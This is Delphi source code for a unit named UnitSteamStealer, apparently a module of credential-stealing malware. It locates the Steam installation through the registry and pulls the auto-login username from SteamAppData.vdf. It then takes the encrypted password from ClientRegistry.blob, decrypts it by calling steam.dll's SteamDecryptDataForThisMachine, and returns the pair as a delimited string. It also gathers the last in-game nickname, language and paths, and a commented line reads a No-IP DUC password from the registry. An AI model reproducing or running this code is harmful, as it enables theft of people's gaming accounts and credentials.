unit UnitSteamStealer;

interface

uses
  Windows,
  StreamUnit;

type
  LongRec = packed record
    case Integer of
      0: (Lo, Hi: Word);
      1: (Words: array [0..1] of Word);
      2: (Bytes: array [0..3] of Byte);
  end;
  { TStringStream }

  TStringStream = class(TStream)
  private
    FDataString: string;
    FPosition: Integer;
  protected
    procedure SetSize(NewSize: Longint); override;
  public
    constructor Create(const AString: string);
    function Read(var Buffer; Count: Longint): Longint; override;
    function ReadString(Count: Longint): string;
    function Seek(Offset: Longint; Origin: Word): Longint; override;
    function Write(const Buffer; Count: Longint): Longint; override;
    procedure WriteString(const AString: string);
    property DataString: string read FDataString;
  end;

const
{ File open modes }

{$IFDEF LINUX}
  fmOpenRead       = O_RDONLY;
  fmOpenWrite      = O_WRONLY;
  fmOpenReadWrite  = O_RDWR;
//  fmShareCompat not supported
  fmShareExclusive = $0010;
  fmShareDenyWrite = $0020;
//  fmShareDenyRead  not supported
  fmShareDenyNone  = $0030;
{$ENDIF}
{$IFDEF MSWINDOWS}
  fmOpenRead       = $0000;
  fmOpenWrite      = $0001;
  fmOpenReadWrite  = $0002;

  fmShareCompat    = $0000 platform; // DOS compatibility mode is not portable
  fmShareExclusive = $0010;
  fmShareDenyWrite = $0020;
  fmShareDenyRead  = $0030 platform; // write-only not supported on all platforms
  fmShareDenyNone  = $0040;
{$ENDIF}

function SteamUserName : String;
function SteamPassword : String;

Function UltimoNickUsadoInGame:string;
Function UserCounterStrikeRate:string;
Function DiretorioDaSteam:string;
Function DiretorioDoExecutavelSteam:string;
Function ConfiguracaoDeIdioma:string;
Function GetSteamPass: string;

type
TSteamDecryptDataForThisMachine = function(EncryptedData :Pchar;
                                           EncryptedDataLength : Integer;
                                           DecryptedBuffer : Pointer;
                                           DecryptedBufferSize : Integer;
                                           DecryptedDataSize : PUINT) : Integer;
                                           cdecl;

var
  SteamPath : String;
  StringStream : TStringStream;
  FileStream : TFileStream;
  I : Integer;
  UserName : PChar;
  EncryptedPassword : PChar;
  DecryptionKey : TSteamDecryptDataForThisMachine;
  PasswordLength : UINT;
  Password : array[0..99] of char;

implementation


function PegaValor( const Key: HKEY; const Chave, Valor: String ) : String;
var handle : HKEY;
    Tipo, Tam : Cardinal;
    Buffer : String;
begin
    RegOpenKeyEx( Key, PChar( Chave ),0, KEY_QUERY_VALUE, handle );
    Tipo := REG_NONE;
    RegQueryValueEx( Handle,PChar( Valor ),nil,@Tipo,nil,@Tam );
    SetString(Buffer, nil, Tam);
    RegQueryValueEx( Handle,PChar( Valor ),nil,@Tipo,PByte(PChar(Buffer)),@Tam );
    Result := PChar(Buffer);
    RegCloseKey( handle );
    Result := PChar(Buffer);
end;

procedure FreeAndNil(var Obj);
var
  Temp: TObject;
begin
  Temp := TObject(Obj);
  Pointer(Obj) := nil;
  Temp.Free;
end;


{ TStringStream }

constructor TStringStream.Create(const AString: string);
begin
  inherited Create;
  FDataString := AString;
end;

function TStringStream.Read(var Buffer; Count: Longint): Longint;
begin
  Result := Length(FDataString) - FPosition;
  if Result > Count then Result := Count;
  Move(PChar(@FDataString[FPosition + 1])^, Buffer, Result);
  Inc(FPosition, Result);
end;

function TStringStream.Write(const Buffer; Count: Longint): Longint;
begin
  Result := Count;
  SetLength(FDataString, (FPosition + Result));
  Move(Buffer, PChar(@FDataString[FPosition + 1])^, Result);
  Inc(FPosition, Result);
end;

function TStringStream.Seek(Offset: Longint; Origin: Word): Longint;
begin
  case Origin of
    soFromBeginning: FPosition := Offset;
    soFromCurrent: FPosition := FPosition + Offset;
    soFromEnd: FPosition := Length(FDataString) - Offset;
  end;
  if FPosition > Length(FDataString) then
    FPosition := Length(FDataString)
  else if FPosition < 0 then FPosition := 0;
  Result := FPosition;
end;

function TStringStream.ReadString(Count: Longint): string;
var
  Len: Integer;
begin
  Len := Length(FDataString) - FPosition;
  if Len > Count then Len := Count;
  SetString(Result, PChar(@FDataString[FPosition + 1]), Len);
  Inc(FPosition, Len);
end;

procedure TStringStream.WriteString(const AString: string);
begin
  Write(PChar(AString)^, Length(AString));
end;

procedure TStringStream.SetSize(NewSize: Longint);
begin
  SetLength(FDataString, NewSize);
  if FPosition > NewSize then FPosition := NewSize;
end;

function StrLen(const Str: PChar): Cardinal; assembler;
asm
        MOV     EDX,EDI
        MOV     EDI,EAX
        MOV     ECX,0FFFFFFFFH
        XOR     AL,AL
        REPNE   SCASB
        MOV     EAX,0FFFFFFFEH
        SUB     EAX,ECX
        MOV     EDI,EDX
end;

function FileAge(const FileName: string): Integer;
{$IFDEF MSWINDOWS}
var
  Handle: THandle;
  FindData: TWin32FindData;
  LocalFileTime: TFileTime;
begin
  Handle := FindFirstFile(PChar(FileName), FindData);
  if Handle <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(Handle);
    if (FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0 then
    begin
      FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
      if FileTimeToDosDateTime(LocalFileTime, LongRec(Result).Hi,
        LongRec(Result).Lo) then Exit;
    end;
  end;
  Result := -1;
end;
{$ENDIF}
{$IFDEF LINUX}
var
  st: TStatBuf;
begin
  if stat(PChar(FileName), st) = 0 then
    Result := st.st_mtime
  else
    Result := -1;
end;
{$ENDIF}

function FileExists(const FileName: string): Boolean;
{$IFDEF MSWINDOWS}
begin
  Result := FileAge(FileName) <> -1;
end;
{$ENDIF}
{$IFDEF LINUX}
begin
  Result := euidaccess(PChar(FileName), F_OK) = 0;
end;
{$ENDIF}

//  Senha:=PegaValor(HKEY_LOCAL_MACHINE,'Software\Vitalwerks\DUC','Password');


function SteamUserName : String;
begin
  result := '';
  try
    SteamPath := PegaValor(HKEY_CURRENT_USER,'Software\Valve\Steam\','SteamPath');
    //Locates UserName within the SteamAppData.vdf file
    FileStream := TFileStream.Create(SteamPath+'\config\SteamAppData.vdf',fmOpenRead);
    StringStream := TStringStream.Create('');
    StringStream.CopyFrom(FileStream, FileStream.Size);
    FreeandNil(FileStream);
    I := Pos('AutoLoginUser',StringStream.DataString);
    I := I + 17;
    UserName := PChar(copy(StringStream.DataString,I,Pos('"',copy(StringStream.DataString,I,100))-1));
    FreeandNil(StringStream);
    Result := UserName;
    except
    Result := '';
  end;
end;

function SteamPassword :String;
begin
  result := '';
  try
    SteamPath := PegaValor(HKEY_CURRENT_USER,'Software\Valve\Steam\','SteamPath');
    //Locates Encrypted Password within the ClientRegistry.blob file
    if not FileExists(SteamPath+'/ClientRegistry.Blob') then Exit else
    begin
      FileStream := TFileStream.Create(SteamPath+'\ClientRegistry.blob',fmOpenRead);
      StringStream := TStringStream.Create('');
      StringStream.CopyFrom(FileStream, FileStream.Size);
      FreeandNil(FileStream);
      I := Pos('Phrase',StringStream.DataString);
      I := I + 40;
      EncryptedPassword := PChar(copy(StringStream.DataString,I,255));
      FreeandNil(StringStream);
      //Uses SteamDecryptDataForThisMachine function from Steam.dll to decrypt password
      DecryptionKey := GetProcAddress(LoadLibrary(PChar(SteamPath+'\steam.dll')),'SteamDecryptDataForThisMachine');
      DecryptionKey(EncryptedPassword, strlen(EncryptedPassword),@Password, 100,@PasswordLength);
      Result := Password;
    end;
    except
    Result := '';
  end;
end;

Function UltimoNickUsadoInGame:string;
Begin
  Result := PegaValor(HKEY_CURRENT_USER,'Software\Valve\Steam\','LastGameNameUsed');
End;

Function UserCounterStrikeRate:string;
Begin
  Result := PegaValor(HKEY_CURRENT_USER,'Software\Valve\Steam\','Rate');
End;

Function DiretorioDaSteam:string;
Begin
  Result := PegaValor(HKEY_CURRENT_USER,'Software\Valve\Steam\','SteamPath');
End;

Function DiretorioDoExecutavelSteam:string;
Begin
  Result := PegaValor(HKEY_CURRENT_USER,'Software\Valve\Steam\','SteamExe');
End;

Function ConfiguracaoDeIdioma:string;
Begin
  Result := PegaValor(HKEY_CURRENT_USER,'Software\Valve\Steam\','Language');
End;

Function EncontrouSteam: Boolean;
var
  VerificaString: string;
Begin
  Result := False;
  VerificaString := PegaValor(HKEY_CURRENT_USER,'Software\Valve\Steam\','Language');
  if VerificaString <> '' then Result := True else Result := False;
End;

Function GetSteamPass: string;
Begin
  if EncontrouSteam then Result := SteamUserName + '|' + SteamPassword + '|' else Result := '';
end;

end.
